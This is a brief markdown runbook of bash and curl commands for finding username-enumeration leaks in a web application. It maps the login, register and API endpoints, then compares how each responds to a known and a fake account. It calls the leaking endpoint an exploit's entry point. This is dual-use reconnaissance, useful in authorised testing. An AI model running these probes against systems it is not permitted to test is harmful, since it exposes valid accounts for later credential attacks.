# Detection playbook — the entry-detection runbook

## Step 1: map the auth surface

```bash
# every account-touching endpoint — from the bundle, the sitemap, the HTML
grep -oE '(login|register|signin|signup|forgot|reset|check|verify|mfa|otp|unlock|invite|auth|token|users)[^"'"'"' ]*' *.js *.html | sort -u
curl -s "$BASE/robots.txt"; curl -s "$BASE/sitemap.xml"
```

## Step 2: the direct-oracle sweep — cheapest first

```bash
for ep in /api/username-available /api/check-username /api/user-exists /check-username; do
  printf '%s good:' "$ep"; curl -s "$BASE$ep?u=$KNOWN" | head -c 50
  printf ' bad:'; curl -s "$BASE$ep?u=$FAKE" | head -c 50; echo
done
```

## Step 3: the register-taken check

```bash
curl -s -X POST -d "user=$KNOWN&email=a@b.c&pass=x&pass2=x" "$BASE/register" | grep -oiE '(taken|exist|already|registered)[^<"]*'
curl -s -X POST -d "user=$FAKE&email=b@b.c&pass=x&pass2=x"  "$BASE/register" | grep -oiE '(taken|exist|already|registered)[^<"]*'
```

## Step 4: the login pair

```bash
curl -i -X POST -d "user=$KNOWN&pass=x" "$BASE/login" > g
curl -i -X POST -d "user=$FAKE&pass=x"  "$BASE/login" > b
diff g b; grep -iE '^HTTP|^location|set-cookie' g b
```

## Step 5: the API pair

```bash
curl -s -X POST -H 'Content-Type: application/json' -d "{\"username\":\"$KNOWN\",\"password\":\"x\"}" "$BASE/api/login"
curl -s -X POST -H 'Content-Type: application/json' -d "{\"username\":\"$FAKE\",\"password\":\"x\"}"  "$BASE/api/login"
```

## Step 6: the detection record

For each endpoint: `oracle` (channel + delta) or `uniform` (all channels)
or `no-endpoint`. The detection is the inventory + the per-endpoint
oracle verdict — the exploit's entry point is the cheapest-leak oracle.
